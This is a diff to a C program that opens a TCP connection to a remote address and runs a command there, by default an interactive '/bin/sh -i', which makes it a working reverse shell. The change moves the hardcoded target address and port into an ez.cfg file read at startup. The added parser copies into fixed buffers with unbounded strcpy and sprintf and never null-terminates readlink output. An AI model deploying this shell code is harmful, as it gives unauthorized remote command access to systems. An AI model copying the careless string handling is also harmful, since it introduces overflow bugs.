@@ -5,18 +5,16 @@
 #include <unistd.h>
 #include <stdlib.h>
 #include <fcntl.h>
+#include <libgen.h>
 
 #include <sys/types.h>
 #include <sys/socket.h>
 #include <netinet/in.h>
 #include <arpa/inet.h>
 
-#define PORTNUM 9000
-#define IP_ADDR "192.168.1.243"  //xxx
-//#define IP_ADDR "127.0.0.1"
-
 void set_fd_non_blocking(int fd);
 void clear_fd_non_blocking(int fd);
+int read_ez_cfg(char *ipaddr, int *port);
 
 int main(int argc, char **argv)
 {
@@ -24,7 +22,15 @@ int main(int argc, char **argv)
     socklen_t          addrlen;
     int                sockfd, ret, ret1, ret2;
     char               buff[10000];
-    char             * cmd;
+    char              *cmd;
+    int                port;
+    char               ipaddr[100];
+
+    // get ipaddr and portnum from esx.cfg file
+    ret = read_ez_cfg(ipaddr, &port);
+    if (ret == -1) {
+        return 1;
+    }
 
     // if arg is not provided for cmd then
     //   set cmd to '/bin/sh -i'
@@ -48,12 +54,12 @@ int main(int argc, char **argv)
     }
 
     addr.sin_family      = AF_INET;
-    addr.sin_port        = htons(PORTNUM);
-    addr.sin_addr.s_addr = inet_addr(IP_ADDR);
+    addr.sin_port        = htons(port);
+    addr.sin_addr.s_addr = inet_addr(ipaddr);
     addrlen = sizeof(addr);
     ret = connect(sockfd,  (struct sockaddr*)&addr, addrlen);
     if (ret != 0) {
-        fprintf(stderr, "ERROR: connect, %s\n", strerror(errno));
+        fprintf(stderr, "ERROR: connect %s:%d, %s\n", ipaddr, port, strerror(errno));
         return 1;
     }
 
@@ -136,4 +142,57 @@ void clear_fd_non_blocking(int fd)
                fd, flags, strerror(errno));
         exit(1);
     }
+}
+
+int read_ez_cfg(char *ipaddr, int *port)
+{
+    char self_path[100], ez_cfg_path[100], *self_dir, *p, s[100];;
+    FILE *fp;
+
+    // preset return config values
+    ipaddr[0] = '\0';
+    *port = 0;
+
+    // get path to ez.cfg file
+    readlink("/proc/self/exe", self_path, sizeof(self_path));
+    self_dir = dirname(self_path);
+    sprintf(ez_cfg_path, "%s/ez.cfg", self_dir);
+
+    // open ez.cfg file
+    fp = fopen(ez_cfg_path, "r");
+    if (fp == NULL) {
+        fprintf(stderr, "ERROR: failed to open %s, %s\n", ez_cfg_path, strerror(errno));
+        return -1;
+    }
+
+    // scan file for ipaddr:port
+    while (fgets(s, sizeof(s), fp) != NULL) {
+        // skip blank lines or lines begining with '#'
+        if (s[0] == '\n' || s[0] == '#') {
+            continue;
+        }
+
+        // extract ipaddr and port from string
+        if ((p = strchr(s, ':')) == NULL) {
+            // error, colon not found
+            break;
+        }
+        *p = 0;
+        strcpy(ipaddr, s);
+        sscanf(p+1, "%d", port);
+        break;
+    }
+
+    // close ez.cfg
+    fclose(fp);
+
+    // if ipaddr and port are not both set then return error
+    if (ipaddr[0] == '\0' || *port == 0) {
+        fprintf(stderr, "ERROR: failed to read ipaddr and port from %s\n", ez_cfg_path);
+        fprintf(stderr, "ERROR: expected format 'xxx.xxx.xxx.xxx:nnnn'\n");
+        return -1;
+    }
+
+    // success
+    return 0;
 }
